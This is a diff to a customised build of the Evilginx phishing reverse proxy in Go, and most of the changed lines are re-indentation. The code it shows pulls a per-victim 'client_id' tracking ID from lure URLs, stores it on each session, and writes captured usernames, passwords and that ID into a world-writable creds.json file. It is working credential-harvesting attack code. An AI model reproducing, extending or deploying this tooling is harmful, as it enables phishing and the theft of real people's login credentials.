@@ -79,7 +79,7 @@ type HttpProxy struct {
 type Creds struct {
     Username string 		`json:"Username"`
     Password string 		`json:"Password"`
-	RId string              `json:"RId"`
+    RId string              `json:"RId"`
     SubmitTime time.Time 	`json:"SubmitTime"`
 }
 
@@ -169,22 +169,22 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
             }
 
             req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
-			lure_url := req_url
+            lure_url := req_url
             req_path := req.URL.Path
             if req.URL.RawQuery != "" {
                 req_url += "?" + req.URL.RawQuery
             }
 
-			// Parse RId out of requests
-			rid := ""
-			ridr, _ := regexp.Compile("client_id=([^\"]*)")
+            // Parse RId out of requests
+            rid := ""
+            ridr, _ := regexp.Compile("client_id=([^\"]*)")
 
-			//fmt.Println("Regex test", ridr.FindString(req_url))
-			rid_match := ridr.FindString(req_url)
-			if len(rid_match) != 0 {
-				rid = strings.Split(rid_match, "=")[1]
-			}
-		
+            //fmt.Println("Regex test", ridr.FindString(req_url))
+            rid_match := ridr.FindString(req_url)
+            if len(rid_match) != 0 {
+                rid = strings.Split(rid_match, "=")[1]
+            }
+        
             //log.Debug("http: %s", req_url)
 
             parts := strings.SplitN(req.RemoteAddr, ":", 2)
@@ -248,7 +248,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                     log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
                                     p.sessions[session.Id] = session
                                     p.sids[session.Id] = sid
-									session.RId = rid
+                                    session.RId = rid
 
                                     landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
                                     if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
@@ -473,7 +473,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                     session := p.sessions[ps.SessionId]
                                     creds.Username = session.Username
                                     creds.Password = session.Password
-									creds.RId = session.RId
+                                    creds.RId = session.RId
                                     creds.SubmitTime = time.Now()
 
                                     credsfile, err := os.OpenFile(filepath.Join(filepath.Join(usr.HomeDir, ".evilginx"), "creds.json"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0777)
@@ -538,7 +538,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                             session := p.sessions[ps.SessionId]
                                             creds.Username = session.Username
                                             creds.Password = session.Password
-											creds.RId = session.RId
+                                            creds.RId = session.RId
                                             creds.SubmitTime = time.Now()											
 
                                             credsfile, err := os.OpenFile(filepath.Join(filepath.Join(usr.HomeDir, ".evilginx"), "creds.json"), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0777)
